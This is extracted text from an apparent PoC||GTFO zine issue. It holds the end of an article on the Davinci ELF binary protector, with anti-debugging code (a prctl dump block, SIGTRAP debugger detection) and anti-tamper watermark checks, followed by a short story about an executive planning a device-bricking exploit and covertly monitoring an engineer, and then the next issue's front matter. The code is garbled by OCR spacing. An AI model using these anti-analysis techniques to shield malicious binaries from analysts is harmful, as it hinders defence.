4 i n t _ p r c t l ( long o p t i o n , unsigned long arg2 , unsigned long arg3 ,
unsigned long arg4 , unsigned long a r g 5 ) {
6
long r e t ;
2
8
__asm__ v o l a t i l e (
"mov %0, %%r d i \n"
"mov %1, %%r s i \n"
"mov %2, %%rdx \n"
"mov %3, %%r 1 0 \n"
"mov $157 , %%r a x \n"
" s y s c a l l \n" : : " g " ( o p t i o n ) , " g " ( a r g 2 ) , " g " ( a r g 3 ) ,
"g" ( arg4 ) , "g" ( arg5 ) ) ;
asm ( "mov %%rax , %0" : "=r " ( r e t ) ) ;
return ( i n t ) r e t ;
10
12
14
16
18 }
20 /∗
∗ Simply c a l l _ p r c t l (PR_SET_DUMPABLE, 0 , 0 , 0 , 0) from your code .
22 ∗ ( I d e a l l y from a g l i b c c o n s t r u c t o r )
∗/
24
void anti_debug_dump ( void ) __attribute__ ( ( c o n s t r u c t o r ) ) ;
26
void anti_debug_dump ( void ) {
28
_ p r c t l (PR_SET_DUMPABLE, 0 , 0 , 0 , 0 ) ;
}
SIGTRAP Detection When breaking binaries, the attacker generally will set breakpoints in specific
areas of the code. With SIGTRAP detection we can detect breakpoints, as they generate a SIGTRAP signal.
Upon detection we can do whatever we like, ideally bail out and kill the program.
45This can be done by creating a signal handler for SIGTRAP. If our signal handler catches the signal, then
it means there is no debugger attached. Since our stub is not linked to libc in any way, we must use our
own syscall wrapper for sigaction. Thanks to Jpanic for pointing out important caveats that must be
considered when doing this.
1 #define SA_RESTORER 0 x04000000
3 /∗ s t r u c t s i g a c t i o n a c t . s a _ r e s t o r e r must p o i n t t o a h a n d l e r
∗ t h a t p e r f o r m s an r t _ s i g r e t u r n ( 0 )−− n o r m a l l y t h i s i s done
5 ∗ by g l i b c .
∗/
7 i n t _ s i g r e t u r n ( unsigned long unused ) {
unsigned long r e t ;
9
__asm__ v o l a t i l e (
"mov %0, %%r d i \n"
11
"mov $15 , %%r a x \n"
" s y s c a l l " : : " g " ( unused ) ) ;
13
__asm__( "mov %%rax , %0" : "=r " ( r e t ) ) ;
return ( i n t ) r e t ;
15 }
17 /∗ We i n c r e m e n t trap_count i f we c a u g h t t h e s i g n a l ∗/
i n t trap_count = 0 ;
19
void s i g c a t c h ( i n t s i g ) {
21
trap_count++;
}
23
/∗ This f u n c t i o n s e t s up a s i g n a l h a n d l e r f o r SIGTRAP
25 ∗ i f a d e b u g g e r c a u g h t i t .
∗/
27
void i n s t a l l _ t r a p _ h a n d l e r ( void ) {
29
struct s i g a c t i o n act , o l d a c t ;
act . sa_handler = s i g c a t c h ;
31
a c t . s a _ f l a g s = SA_RESTORER;
act . sa_restorer = r e s t o r e ;
33
s i g e m p t y s e t (& a c t . sa_mask ) ;
s i g a d d s e t (& a c t . sa_mask , SIGTRAP) ;
35
// must p a s s s i z e o f ( l o n g ) or k e r n e l r e t u r n s −EINVAL
_ s i g a c t i o n (SIGTRAP, &ac t , NULL, s i z e o f ( long ) ) ;
37
}
39
void d e t e c t _ d e b u g g e r ( void ) {
41
__asm__ ( " i n t 3 \n"
" nop " ) ;
43
i f ( trap_count == 0 )
b a i l _ o u t ( ) ; // d e b u g g e r c a u g h t t h e t r a p , b a i l o u t !
45
trap_count = 0 ;
}
There exist other anti-debugging techniques not used in this example. /proc/self/status can check if
a ptrace attachment exists. Junk or misaligned assembly code could be used to obfuscate the application
against a disassembler while keeping it functionally equivalent.
Advanced reverse engineers will go well beyond the use of ptrace()-based debuggers when attempting
dynamic analysis. Such engineers might use the Pin instrumentation framework, an emulator, or ERESI’s
e2dbg.
Detection of Pin hooking can be done by checking /proc/self/maps to see whether the mapping called
[vvar] exists after [vdso]. This happens when vdso has been partially remapped by Pin.
Emulation detection can also be performed by rtdsc timestamp checking.
469.3.4
Code and data watermarking
To enforce our anti-debugging code so that it is not easily circumvented, we have some simple code and data
watermarking in-place. As mentioned earlier, if someone were to modify the enable_anti_debug() code,
or simply jump over it, it would be rendered useless. We must therefore be prepared to detect when this
happens and act accordingly by exiting or killing the program before it is successfully cracked.
Data Watermarking For the data watermarking, we have a static initialized variable that is set to 0 and
only incremented after the enable_anti_debug() function successfully completes. Later on, we check the
value of this variable. If it has not been incremented, then we can assume that an attacker either jumped
over the anti-debug code or NOP’d it out.
2
void d e n i e d ( void ) {
bail_out ( ) ;
}
4
6
void a c c e p t e d ( void ) {
__asm__ __volatile__ ( " nop \n" ) ;
}
8
_start () {
uint64_t a [ 2 ] , x ;
void ( ∗ f ) ( ) ;
12
int r e t ;
10
14 . . . <code> . . .
16 a [ 0 ] = ( u i n t 6 4 _ t )&d e n i e d ;
// a [ 0 ] p o i n t s t o d e n i e d ( ) a d d r e s s
a [ 1 ] = ( u i n t 6 4 _ t )&a c c e p t e d ;
// a [ 1 ] p o i n t s t o a c c e p t e d ( ) a d d r e s s
x = a [ ! ( ! ( data_watermark ) ) ] ;
// c o n v e r t data_watermark t o a b o o l e a n , 0 or 1
f = ( void ∗ ) x ;
// a s s i g n f u n c t i o n p o i n t e r t o e i t h e r a c c e p t e d ( ) or d e n i e d ( )
f () ;
// c a l l a c c e p t e d ( ) or d e n i e d ( )
18
20
22
. . . <code> . . .
}
As we can see by the code snippet above, if data_watermark was not incremented it will still be 0, so we
can assume that an attacker jumped over the enable_anti_debug() code. So denied() would be called,
which calls bail_out() to kill the process. Otherwise, accepted() will be called, which does nothing, and
our binary goes on running untampered.
Code Watermarking For the code watermarking, we want to validate that the enable_anti_debug()
function has not been modified in any way. We do this by simply fingerprinting it.
1 /∗ From d a v i n c i . h ∗/
typedef struct code_watermark {
3
uint32_t code_size ;
u i n t 8 _ t c o d e _ s i g n a t u r e [CODE_CHUNK_SIZE ] ;
5 } code_watermark_t ;
7
/∗ From d a v i n c i . c
∗ NOTE: ’ u i n t 8 _ t ∗mem i s a mapping o f t h e s t u b e x e c u t a b l e ’
∗ This code w i l l c r e a t e t h e f i n g e r p r i n t o f e n a b l e _ a n t i _ d e b u g ( ) and s t o r e
11 ∗ i t w i t h i n t h e s t u b e x e c u t a b l e
∗/
13
. . . <code> . . .
9
15
symval = r e s o l v e _ s y m b o l ( " enable_anti_debug " , mem) ;
4717
19
21
23
25
s y m s i z e = r e s o l v e _ s y m b o l _ s i z e ( " enable_anti_debug " , mem) ;
o f f s e t = t e x t O f f s e t + ( symval − textVaddr ) ;
code_watermark = ( code_watermark_t ∗ ) a l l o c a ( s i z e o f ( code_watermark_t ) ) ;
memcpy ( ( u i n t 8 _ t ∗ ) code_watermark−>c o d e _ s i g n a t u r e , ( u i n t 8 _ t ∗ )&mem[ o f f s e t ] , s y m s i z e ) ;
code_watermark−>c o d e _ s i z e = s y m s i z e ;
symval = r e s o l v e _ s y m b o l ( " code_watermark " , mem) ;
s y m s i z e = r e s o l v e _ s y m b o l _ s i z e ( " code_watermark " , mem) ;
o f f s e t = d a t a O f f s e t + ( symval − dataVaddr ) ;
memcpy ( ( void ∗ )&mem[ o f f s e t ] , ( void ∗ ) code_watermark , s i z e o f ( code_watermark_t ) ) ;
. . . <code> . . .
27 /∗ From s t u b . c
∗ We memcmp t h e e n a b l e _ a n t i _ d e b u g ( ) f u n c t i o n w i t h code_watermark . c o d e _ s i g n a t u r e .
29 ∗ I f t h e r e a r e any d i s c r e p a n c i e s , we c a l l d e n i e d ( ) , which b a i l s o u t and p r i n t s t h e message
∗ "The g a t e s o f heaven remain c l o s e d "
31 ∗/
. . . <code> . . .
33
a [ 0 ] = ( u i n t 6 4 _ t )&a c c e p t e d ;
35
a [ 1 ] = ( u i n t 6 4 _ t )&d e n i e d ;
r e t = _memcmp( ( u i n t 8 _ t ∗ ) code_watermark . c o d e _ s i g n a t u r e , ( u i n t 8 _ t ∗ ) enable_anti_debug
, code_watermark . c o d e _ s i z e ) ;
37
x = a [ ! ( ! ( ret ) ) ] ;
f = ( void ∗ ) x ;
39
f () ;
. . . <code> . . .
9.4
Getting Davinci
The Davinci source code tarball is stored in a davinci seal itself :)
chmod +x d a v i n c i . t g z . dvs
2 . / d a v i n c i . t g z . dvs d4v1nc1 > d a v i n c i . t g z
tar zxvf davinci . tgz
48“For the last time, Brian,” said Barbie, “$4C is absolute
jump and $6C is indirect jump. It’s like this: $4C is me
telling you that you’re an idiot; $6C is me pointing you to a
piece of paper that says, ‘You’re an idiot.’ And what the hell
are you smiling at, Steven? You’ve got code here that overwrites
the ROM monitor. Unless your last name is Wozniak, STFO out of
$F000 block.”
4910
Observable Metrics
fiction by Don A. Bailey
from a concept developed with Tamara L. Rhoads and Jaime Cochran
for J. O., A. S., and S. G. S.
Gold from the late November sun washed an oth-
erwise porcelain hallway, as the door to the Vice Pres-
ident of Engineering’s office opened. Stepping into
this naturally lit office, out of the antiseptic hall, was
a reminder of the perks of a hard earned career rolling
out next generation Internet of Things technology.
He stood in the center of the room, smiling an
inviting smile, while rays of light seemed to flow from
the tips of his outstretched arm. He beckoned the
engineer to sit. His raised standing-desk was ele-
gantly constructed in a nod to George Nakashima’s
signature style. Its varnished surface accentuated the
tree rings underneath through a translucent hue. The
sides of the desktop were kept natural, almost raw.
Some of the tree’s original bark still proudly masked
the unfinished growth hidden below.
To the left of the desk stood a large American
flag, whose pole rose to centimeters below the ceil-
ing. Its fabric moved slightly to the rhythm of the
office air, which was coaxed around the room by an
unseen and unheard ventilation system. The flag
seemed to be placed purposefully on this side of the
room, at the edge of the wall of windows that faced
south San Diego bay, where a battleship sat in the
distance. Tiny figures in white were noticeably scur-
rying around the flat, grey deck, in what seemed to
be a concerted effort to clean the behemoth.
She smiled as she sat down. The chair’s leather
creaked under her slim figure, as her body adjusted
to the boxy and industrial shape of the Le Corbusier-
style object.
“Thank you for joining me for a quick discussion!
I know how busy you are with the final security audit
of the new 768 product line,” the VP smiled, one arm
relaxing on the edge of his standing desk, the other
casually half-hanging from his designer jeans pocket.
Before the engineer could comment on the
progress of the current audit, the VP questioned her.
“How do you feel about the security of the new low-
power mesh module? It’s pretty robust for being able
to fit on the new product line, isn’t it?”
She paused before answering, expecting the si-
lence was only a dramatic pause before he contin-
ued on with the wireless module he designed him-
self. Even though it was yet another low-power wire-
less module, it was designed using transparent silicon,
50
and is able to integrate seamlessly into their new eye-
contact heads-up-display line. What was even more
impressive was the fact that he designed the module
to use a new energy harvesting method that relied
on the human eye’s restlessness, its constant micro-
movements, its tremors, to generate the small bursts
of power required to drive the transceiver. It was all
very impressive, and very heavily patented.
A new mesh protocol had to be designed, in or-
der for the extremely low-power transceiver to work
effectively. The protocol was heavily vetted from a
security perspective prior to filing the patents. Even
the company lawyers had to get involved by assisting
with the high level threat modeling process, especially
since weaknesses in this protocol could allow attack-
ers to hijack a victim’s imaging data, let alone their
vital statistics. She knew this was all done prior to
her arrival at the organization, just over a year and a
half ago. Obviously, he was looking for a little praise.
“The security architecture is excellent. I don’t
think there is anywhere that I could add value to the
project,” she smiled. She wasn’t going to drip sac-
charine words from her mouth. The truth was good
enough as a compliment.
“Excellent,” he regurgitated with his chin in the
air. “Excellent.”
He continued, “But you did find the security flaw
in our cryptographic key storage chip. That was ex-
cellent work. We needed someone with your expertise
to help find out how we’d end up hacked.”
“Yeah, but to be honest, I’m just following the
recommendations of other researchers that have done
prior work in this area. Tarnovsky, Nohl, and even
Nedospasov have given presentations on strong at-
tacks in this area. It’s really just a matter of bypass-
ing the chip’s security mesh with existing technol-
ogy that was designed for complex hardware analysis.
Not to mention, you can use similar attacks against
Physically Unclonable Functions. . . ” She realized his
eyes had glazed over, and looked sheepishly at her
feet, which were tapping nervously against the cold,
cylindrical legs of the Le Corbusier replica.
Her moment of emotional self-doubt aroused him
from his entranced state. He scoffed “Yeah, I’m sure
everybody can hack hardware like that, these days.”
Realizing his eagerness to exploit her humility wasobvious, he regained his composure and ran his hand
through one side of his hair and smiled. “You did
excellent work, there. I was impressed.”
She couldn’t help herself from narrowing her eyes.
She thought this was just a check-in on the status of
the mesh security architecture. But, now, she knew
he needed something else. What was bothering her
was that this typically direct, type-A male was seem-
ingly taking the round-about in arriving at the real
topic.
“So, how can I help you? I’m sure you didn’t ask
me to your office to discuss research. What’s up?”
she offered, her right foot still tapping against the
chair leg.
“I just got word this morning, entities overseas
have recreated your work. I guess I should say they’ve
independently discovered the security flaw.” The VP
leaned forward, putting the weight of his abs on the
standing desk, his thick chest pointed directly toward
her. His knuckles whitened, his hands gripped the
sides of the desk, as he leaned even further over the
desk like a reverend poised at a pulpit, ready to spit
out a sermon.
“Those sons of bitches not only have broken this
device, but they’ve broken every one of our products!
How are they doing it?!” His oddly calm voice was
chilling in contrast to the hulking position his body
took behind the pulpit-like desk. “I don’t even care
how anymore. I really don’t.”
“The clones they’ve been building of our prod-
ucts have been flooding the foreign markets for sev-
eral years.” he continued. “Our quarterly earnings
are hundreds of millions of dollars short on revenue
because of these cheap knock-off items. I don’t even
want to look some of our investors in the eye because
we can’t keep these people out of our market.”
The man moved out from behind his pulpit and
stood in the center of the room, with the rays of the
sun behind him. As he leaned in, the angle of the sun-
light caused his face to become engulfed in shadow.
He spoke so softly now that she had to lean in, mak-
ing his aggressive posture even more uncomfortable.
“It’s weak. It’s pathetic. I want it stopped”.
The young engineer was barely able to contain her
sigh of relief. “For a second there, I thought you were
going to fire me,” she half-joked.
He raised his body into a polite, standing posture
and laughed whole-heartedly, “No, no! My apologies!
You’re imperative to this organization, now! I know
how hard you’ve worked, you should have absolutely
no concerns about your performance. The fact is, I
51
need your advice.”
She put her hand to her chest. Her foot moved
away from the metal chair leg, where it had al-
ready began to tarnish the gleaming silver. Her eyes
widened as she humbly replied “Thank you, I really
appreciate that. Sometimes it’s a bit hard, you know,
still being ‘the new guy’ even after a year and a half
of effort.”
He picked up a white mug half filled with black
tea and emblazoned with the company logo from his
desk, and took a sip. His eyes affixed somewhere past
her, as if he were caught up in another distant con-
versation she couldn’t hear. “Don’t be ridiculous, he
replied. You’re excellent. . . ”
“Unfortunately, sir, I have to tell you what you
already know. Unbreakable security is simply impos-
sible. It’s just never going to happen. We build effec-
tive models so that arbitrary people can’t affect the
products of millions of people. But, anyone with ad-
equate funding can attack and learn about any given
system. No proprietary technology will stop some-
one from cloning or reproducing someone else’s work.
Security just can’t achieve a goal like that.”
Her eyes were light, but serious. She understood
his frustration, and even sympathized with him. He
had worked so relentlessly for so many years building
new and innovative things that leeches just flippantly
dressed in cheap 3D plastics and silk screened logos.
They had no respect for the artist behind the engi-
neering degree. They only saw a Giovanni Bellini that
was finally forgeable, because no one decaps an inte-
grated circuit to see if the eye-contact wearable device
was sculpted by the real artist, or by a second-rate
hack. They only want to flaunt the logo most recently
approved by the hip kids, and the ability to Tweet
photos of Bae with a champagne glass balanced on
her ass.
“Yeah.” He sighed. “Yeah, you’re right. I know
that better than most. We’ve lost billions in revenue
over the past few years of success. People call us a
success. We rang that bell in New York City, and it
looked like a success. The world looks at us as if we
are a success. They want to use our devices regardless
of who actually made it.”
He took a long, slow sip of his black tea. When his
lips parted from the porcelain, and the mug turned
slightly, she could see a single black bead of tea drip
lazily down its side. His disposition darkened, seem-
ingly descending as quickly as that tiny drip of tea
through the manufactured air and onto the office
floor.“But fuck them. We aren’t a success. We can’t
even keep those people out of our security chips.”
He placed an elbow on his standing desk, resting
his hair in his hand. “I’m done caring about how to
solve security. It’s just a god damned cat and mouse
cycle of nonsense.” He looked her straight in the eyes.
“Nonsense!” he loudly snarled. He looked downward,
his other hand still attached to the vessel holding the
blackened liquid. He continued more calmly.
“They forge our logos. They recreate our software.
They steal our customers. We have a right to protect
ourselves. Technically, if they use our trademarks,
their devices are ours. We just didn’t make them. If
they’re ours, we have a right. We have a god damned
right to do with them as we please.”
His eyes tightened as he stood up as straight as the
flagpole next to him. “We have a god damned duty
to our employees, our investors, and our country, to
protect what’s ours. If they’re going to produce tech-
nology that they claim is ours, we have the right to
take that technology. We have a right to destroy that
technology.”
He looked over at his standing desk, and hit a key
on his laptop’s keyboard. He glanced at the screen
for a brief moment, then continued.
“I need a way to stop this nonsense. I’m sick of
worrying about someone hacking into this or hacking
into that. We need this game finished. No more cold
war bullshit with fake engineers and shell companies
overseas. I’m done. I’m fucking done. I need a way to
brick every single device that claims it’s one of ours.
If it connects to the Internet and sends a message say-
ing it’s owned by Fit’d, Inc., I want it bricked. If it
connects to a computer and identifies itself as Fit’d,
Inc., I want it bricked. If it peers with another mesh
device and claims it’s Fit’d, Inc., I want it bricked.
They’re done. These people are fucking done. And
you? You’re going to write the exploit.”
Her eyes widened again, this time in discomfort.
She understood why he seemed so unable to hold back
these worsening emotions. He was on the edge, if not
slightly beyond it.
“But, we have absolutely no way of knowing how
this will affect the end users!” Her right foot began
tapping madly again, as she leaned forward in her
52
chair. Her body barely hung on to the edge of her
seat, practically mirroring how his mind must be tee-
tering on its ethical edge, half ready to give itself to
the wind, leaping recklessly into the abyss. “We can’t
possibly put people’s lives at risk like that! You re-
alize how many infinite scenarios there are for people
using our technology! Think of how people are using
wearables to monitor and control their pacemakers,
their insulin pumps, their seizure reducers. . . There
are people who could die if their products are sud-
denly unable to function!”
The VP briskly walked the few steps toward the
shaken woman, with a pointed finger and furrowed
eyebrows, “These people are putting themselves at
risk by knowingly purchasing cloned technology! You
said it yourself in your security review of a third-party
clone: there was no guarantee that reproduced work
could even come close to ensuring the confidential-
ity, integrity, or availability of a consumer’s data! No
guarantee!” he barked.
“But, sir!” her body was pinned against the back
of the chair, as if forced there by a sudden atmo-
spheric microburst. “The impoverished buy these
knock-offs because they can’t afford the real thing.
There is a user base of millions in foreign countries
that depend on this technology for their basic commu-
nication needs. It isn’t about protecting our product,
our trademark, or even our corporate persona.” She
calmed down as she heard the sensible words starting
to emanate from her mouth.
“It’s about a worldwide phenomenon that this
company has created. That you’ve helped create!
People want to participate, they want to be in this
brave new world, but it’s just a fact that not everyone
can afford what we sell.”
“By arbitrarily disabling these devices you’re
widening the communication gap between the have’s
and have-not’s. Think about how clones of this com-
pany’s technology are used to connect millions of peo-
ple to the world. People in oppressive governments,
people in religiously strict societies, people without
access to broadband in their region. It’s their only
method for keeping up with worldwide evolution in
culture. You’re risking sending a large portion of the
Internet back into the technological stone age. If you
destroy these people’s tools, they’re going to have to
essentially uplink other modern mesh devices, depen-
dent on clones of our technology, to the Internet us-
ing the equivalent of ancient serial-port speeds. For
what? Ten percent of what this company makes in
revenue per quarter?”The VP sat his mug down on the desk, his brow
still furrowed. Half of his hair, where one hand had
been nervously running its fingers, was sticking out
sideways, in some laughable nod to a Hollywood mad
man. The other side was eerily plastic, like some
bizarre executive Ken doll. As he turned to the
side, the rustled hair disappeared, and the words that
came out of his mouth seemed even more despica-
ble while rolling out of what seemed like a perfectly
coiffed, button-downed executive.
“If we don’t hit these companies where they hurt
the most, the end users, we won’t ever hurt them.
We need to show them that it’s their fault people are
dying. We need to prove to them that what they are
doing can hurt actual people.” He turned to face her,
his unkempt hair appearing as he further proclaimed
his righteousness. Again, he glanced back at his lap-
top, gauging something, then quickly looked away.
“These companies are risking lives as it is. They
make an inferior product that lacks the guarantees
that we can make. People will get hurt eventually,
and what if it’s in the millions? We can put a stop to
it now, and maybe only a couple thousand get hurt.
If we act today, we can potentially save millions later.
You can help me put an end to this. You can help
me save those millions of lives. You can help save this
company, if we can build the perfect remote exploit.”
His disregard for human life was somehow not
shocking to her. She wasn’t sure why. Maybe it was
always there, under the surface of his skin, hidden
behind that natural hippy-turned-professional vibe.
Maybe it was the fact that he claimed to care about
the ecosystem, posturing with the Boulder, Colorado
mindset, while driving a gas guzzling Porsche, and
flying in a private jet whose pollution costs were off-
set by carbon credits. She didn’t know why it made
sense. It just did.
It wasn’t shocking, but it was terrifying to her.
Even if she quit, if he was this far gone, how could she
trust him not to hurt her? Did anyone else even know
about this? Was she the only one he told? Would he
hurt her to keep this psychotic rant from going be-
yond these walls? Was this a test? It sure as hell
didn’t feel like a test. It felt real. It felt dangerous.
Suddenly, a pop-up appeared in her line of vision.
Her own eye-contact heads-up-display was notifying
her that she was perspiring and had an elevated heart
rate, but didn’t seem to be moving in any particular
direction. “Are you feeling okay?” the artificial intel-
ligence asked in a little text pop-up box, as her fit-
ness statistics hovered in little graphic-user-interface
53
clouds throughout her field of vision. “I can sense
that you seem to be running, but our movement mesh
shows you aren’t moving. Would you like to recali-
brate?”
The intrusion of these observable metrics into this
ridiculously cartoonish scenario simply furthered her
disbelief that any of this was actually happening.
This began to seem more and more like a bizarre
and belated Halloween prank. As her heart thumped
louder and louder, she couldn’t help but break into a
humiliatingly inappropriate grin. Was he crazy? Was
she? Was any of this happening?
The eye-contact queried again: “Would you like
to recalibrate?”
“Yes, this is real.” he stated with an absurd calm
that sent chills down her spine. He instantly seemed
more in control than ever. He was almost gloating!
Whatever he kept glancing at on his laptop screen
was reassuring him. “This is very real.”
“How did you know that’s what I was thinking?!
You’re putting me through some kind of fucked up
joke, right? Some kind of loyalty test? This isn’t
funny. I don’t think it’s funny.” She tried to gather
herself. She stood up, but seemed frozen by his lack
of reaction. “I quit. I have to quit. Even if this is a
joke or a test, it’s too fucked up. I can’t. . . ”
“You can’t?” he said. He grabbed his standing
desk and twisted it back, flattening the desktop sur-
face before hitting a switch with his foot that enabled
the surface to be lowered, then loudly slammed the
desk down into its sitting position. The shotgun-like
boom of the thick, flat, cherry wood smacking more
thick flat wood was unbearable! He slowly wheeled
the desk over to the center of the room, in front of
a setting San Diego sun. “You can’t what? Change
the world? You’re afraid of the cost of change. I get
it. It takes a lot of bravery to do what we do here, to
make real, tangible change. Sometimes, that cost is
unthinkable. But, we do it, because we can aff. . . .”
“Because you fucking can!” she exclaimed, infu-
riated by his sudden calm. “Say it! Because you
fucking can! Knock it off with the perpetual rhetoric
nonsense! You do it because you fucking can!” Tears
began to well up in her eyes, still waiting for the rest
of the executive team to burst through the doorway
exclaiming this horrible test of will and ethics was
over.
The sun finally lowered over the late afternoon
horizon, sending a green flash, and pink hues barrel-
ing into the suddenly quiet office room. The flat gray
surface of the battleship was devoid of little men inwhite. The barrel of the turret they were polishing
earlier now seemed to be pointed in her direction.
Was it pointing this way earlier? She couldn’t re-
member. It must have been.
She felt her temperature rising, even with the sun
disappearing. Her HUD popped up another little text
box into her field of vision exclaiming that her core
temperature has elevated to 99 degrees Fahrenheit.
She wanted desperately to run out of the office. But
where would she go? And would the guards at the
building exits stop her? Or would there be little men
in white to cleanse this building of her presence?
“If you run, that will be a big problem for you,”
he smirked. “Please, sit back down. We have much
to discuss.”
“How the fuck?” Suddenly, she saw it. He wasn’t
glancing at instant messages. It wasn’t stock prices
he had been monitoring throughout the discussion.
As the sun set, the world outside darkened almost in
parallel with the tone in the office. And it was there, a
clear reflection in the wall of windows in front of her.
As her vital statistics updated in real time on her
HUD, she could see the updates slightly delayed on
the screen of his laptop. He had been playing with her
emotions the entire time! He was watching how she
would react, how she would process what he told her,
whether she was a threat to him. . . He could predict
what she was thinking by analyzing all the sensors in
their wearable mesh network: the heart rate sensor,
the perspiration sensor, 3D body positioning, mouth
dryness, blink-rate analysis, muscle tension monitor-
ing. . . He couldn’t read her mind, but his machine
learning software was analyzing what she was most
likely thinking, and it was god damned close. . .
She recklessly shoved a black painted fingernail
into her eye, nearly scratching her retina as she dug
out the wireless-enabled contact. Her teeth clenched
as she tried to stop herself from reacting from the
pain. “Mother fucker!!! Fuck you!”
He laughed casually, motioning again to the chair.
“Please, take a seat.”
“Why should I! You’re fucking insane!”
“Why? Because everyone you know and love wears
these sensors now. Not the cheap knock offs. The real
ones. And we can access them all remotely thanks to
the security architecture that you signed off on. Not
to mention, someone told those people how to break
these security chips, and that report was for internal
54
use only. Someone will get blamed. We both know it
wasn’t you, but how can you prove it wasn’t?”
She almost spoke the obvious. . .
“Yes, you could tell them all about the so-called
evil we can do here. Blah, fucking blah. You’ll just
sound like another pressured paranoid security engi-
neer that finally snapped, gone schizophrenic, think-
ing trojan horses are communicating to the devices
in your SCIF using sound waves projected through
your own body. You’ll be another fucking psychotic
loser that no one gives a shit about because no one is
strong enough to be comfortable around your Enemy
Of The State, Three Days of the Condor, stereotypi-
cal bullshit.”
“They will listen to me. . . ”
“Listen to a blue haired ex-punk rock wannabe
corporate security fuck? The door is right behind
you. There are lots of people in the building right
now. Want to give it a shot? Go for it.” his smile
was almost razor-thin. “Go ahead. See what they
think.”
Her eyes were blood red from anger, humiliation,
her fingertip, and a feeling of complete loss of control.
As she stood in the center of the room, her foot be-
gan to twitch, tapping out some unheard, emotionally
exhausting, industrial-rock song.
“Now, then. Why don’t you sit down. We have
much to discuss.”
Her body shook as she sat back down in the L3
reproduction. She could feel the noiseless ventilation
system come back on. As her hands touched the cold
metal frame of the chair underneath her, the frigid
air slid like unwanted fingers down the back of her
neck. In silence, she watched the American flag in
the corner wave hypnotically to the oscillation of the
hidden fans, as the fluorescent lights flickered above
the darkened crescent skin under the man’s machi-
nated, inanimate eyes.
The world outside had fully relinquished what was
left of its grip on the evening sun, as if it had given
up its fight against the incessant hum of the digitally
controlled fluorescent lighting. A pulsing, flickering,
buzzing, manufactured light which bullied its way
through these office windows and outside, into the
uncertain San Diego streets. A reflection in the win-
dows shone a familiar pop-up flashing on the man’s
laptop’s screen.
“Would you like to recalibrate?”5511
A Call for PoC
by Pastor Manul Laphroaig, Proselytizer of Weird Machines
Howdy, neighbor! Is that a fresh new PoC you are hugging so close? Don’t stifle it, neighbor, it’s time
for it to see the world, and what better place to do it than from the pages of the famed International Journal
of PoC or GTFO? It will be in a merry company of other PoCs big and small, bit-level and byte-level, raw
binary or otherwise, C, Python, Assembly, hexdump or any other language. But wait, there’s more—our
editors will groom it for you, and dress it in the best Sunday clothes of proper church English. And when it
looks proudly back at you from these pages, in the company of its new friends, won’t that make you proud?
So set that little PoC free, neighbor, and let it come to me, pastor@phrack org!
–——–
———
—–—–
———
–—–
——–
—
––—–
———
Do this: write an email telling our editors how to do reproduce *ONE* clever, technical trick from your
research. If you are uncertain of your English, we’ll happily translate from French, Russian, or German. If
you don’t speak those languages, we’ll dig up a translator.
Like an email, keep it short. Like an email, you should assume that we already know more than a bit
about hacking, and that we’ll be insulted or—WORSE!—that we’ll be bored if you include a long tutorial
where a quick reminder would do. Don’t try to make it thorough or broad.
Do pick one quick, clever low-level trick and explain it in a few pages. Teach me how to make music
that also parses as PSK31, RTTY, or WeFax. Show me how to reverse engineer SoftStrip barcodes. Don’t
tell me that it’s possible; rather, teach me how to do it myself with the absolute minimum of formality and
bullshit.
Like an email, we expect informal (or faux-biblical) language and hand-sketched diagrams. Write it in
a single sitting, and leave any editing for your poor preacherman to do over a bottle of fine scotch. Send
this to pastor@phrack org and hope that the neighborly Phrack folks—praise be to them!—aren’t man-in-
the-middling our submission process.
56PASTOR MANUL LAPHROAIG’s
INTERNATIONAL JOURNAL OF
PoC k GTFO,
CALISTHENICS & ORTHODONTIA
IN REMEMBRANCE OF
OUR BELOVED DR. DOBB
BECAUSE
THE WORLD IS ALMOST THROUGH!
March 19, 2015
7:2 AA55, the Magic Number 7:7 Extending AES-NI Backdoors
7:3 Laser robots! 7:8 Innovations with Core Files
7:4 A Story of Settled Science 7:9 Bambaata on NASCAR
7:5 Scapy is for Script Kiddies 7:11 A Modern Cybercriminal
7:6 Funky Files, the Novella! 7:12 Fast Cash for Bugs!
–——–
———
—–—–
———
–—–
——–
—
––—–
Heidelberg, Baden-Württemberg:
Funded by Single Malt as Midnight Oil and the
Tract Association of PoCkGTFO and Friends,
to be Freely Distributed to all Good Readers, and
to be Freely Copied by all Good Bookleggers.
Это самиздат; therefore, go ye into all the world, and preach the gospel to every creature!
0, $0, £0. pocorgtfo07.pdf.
1
———Legal Note: This telecast is copyrighted by the NFL for the private use of our audience. Any other use of this
telecast or of any pictures, descriptions, or accounts of the game without the NFL’s consent, is prohibited. Just
kidding!
Reprints: Bitrot will burn libraries with merciless indignity that even Pets Dot Com didn’t deserve. Please
mirror–don’t merely link!–pocorgtfo07.pdf and our other issues far and wide, so our articles can help fight the
coming robot apocalypse.
Technical Note: This issue is a polyglot that can be meaningfully interpreted as a ZIP, a PDF, a BPG, or HTML
featuring a BPG decoder. We no longer include prior issues in the zip, in order to leave room for more curiosities.
Don’t be surprised when you stumble upon occasional polyglot матрёшки and chimeras.
Dedication: This issue is dedicated to Terry Pratchett, R.I.P.
“I meant,” said Ipslore bitterly, “what is there in this world that makes living worthwhile?”
Death thought about it.
Cats, he said finally. Cats are nice.
Printing Instructions: Pirate print runs of this journal are most welcome, but please do it properly! PoCkGTFO
is to be printed duplex, then folded and stapled in the center. Print on A3 paper in Europe and Tabloid (11” x 17”)
paper in Samland. Secret government labs in Canada may use P3 (280 mm x 430 mm) if they like. The outermost
sheet should be on thicker paper to form a cover.
1 # This i s how t o c o n v e r t an i s s u e f o r d u p l e x p r i n t i n g .
sudo apt−g e t i n s t a l l pdfjam
3 pdfbook −−s h o r t −edge p o c o r g t f o 0 7 . p d f −o p o c o r g t f o 0 7 −b o o k l e t . p d f
Preacherman
Ethics Advisor
Poet Laureate
Editor of Last Resort
Carpenter of the Samizdat Hymnary
Funky File Formats Polyglot
Assistant Scenic Designer
Special Correspondent on NASCAR
Minister of Spargelzeit Weights and Measures
2
Manul Laphroaig
The Grugq
Ben Nagy
Melilot
Redbeard
Ange Albertini
Philippe Teuwen
Count Bambaata
FX1
With what shall we commune this evening?
Neighbors, please join me in reading this eighth release of the International Journal of Proof of Concept or
Get the Fuck Out, a friendly little collection of articles for ladies and gentlemen of distinguished ability and
taste in the field of software exploitation and the worship of weird machines. If you are missing the first
seven issues, we the editors suggest pirating them from the usual locations, or on paper from a neighbor
who picked up a copy of the first in Vegas, the second in São Paulo, the third in Hamburg, the fourth in
Heidelberg, the fifth in Montréal, the sixth in Las Vegas, or the seventh from his parents’ inkjet printer
during the Thanksgiving holiday.
